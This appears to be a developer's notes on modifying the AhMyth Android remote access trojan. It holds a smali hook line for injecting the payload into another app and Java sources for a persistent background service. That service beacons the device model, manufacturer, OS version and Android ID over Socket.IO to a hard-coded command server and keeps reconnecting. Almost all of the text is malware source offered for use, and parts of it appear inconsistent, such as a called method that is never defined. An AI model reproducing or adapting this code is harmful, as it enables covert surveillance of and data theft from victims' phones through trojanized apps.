## New Hook Method
```smali
invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function

. MainActivity.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.Activity;

import android.os.Bundle;

public class MainActivity extends Activity {

    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        MainService.startService(this);

        finish();

    }

}
```

- MainService.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.Service;

import android.content.Context;

import android.content.Intent;

import android.os.Handler;

import android.os.IBinder;

import android.os.Looper;

import java.lang.reflect.Method;

public class MainService extends Service {

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startService(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startService(context);

        }

    }

    // Smali hook point

    public static void start() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    public static void startService(Context context) {

        context.startService(new Intent(context, MainService.class));

    }

    @Override

    public IBinder onBind(Intent intent) {

        return null;

    }

    @Override

    public int onStartCommand(Intent intent, int flags, int startId) {

        IOSocket.start(this);

        return START_STICKY;

    }

}
```
- MyReciever
```java
package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        intent = new Intent( context, MainService.class );
        MainService.startService(context);

    }
}
```
- IOSocket.java
```java
package ahmyth.mine.king.ahmyth;

import android.os.Build;

import android.provider.Settings;

import java.net.URISyntaxException;

import io.socket.client.IO;

import io.socket.client.Socket;

import java.lang.reflect.Method;

import android.content.Context;

import android.os.Handler;

import android.os.Looper;

public class IOSocket {

    private static Context context;

    private static IOSocket ourInstance = new IOSocket();

    private io.socket.client.Socket ioSocket;

    

    

    // Launched from activity

    public static void start(Context context) {

        IOSocket.context = context;

        

    }

    public static void startContext() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            start(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            start(context);

        }

    }

    

    private IOSocket() {

    	try {

    		

    		String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);

      IO.Options opts = new IO.Options();

      opts.reconnection = true;

      opts.reconnectionDelay = 5000;

      opts.reconnectionDelayMax = 999999999;

      ioSocket = IO.socket("http://192.168.225.241:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);

       } catch (URISyntaxException e) {

            e.printStackTrace();

       }

    }

    public static IOSocket getInstance() {

        return ourInstance;

    }

    public Socket getIoSocket() {

        return ioSocket;

    }

}
```
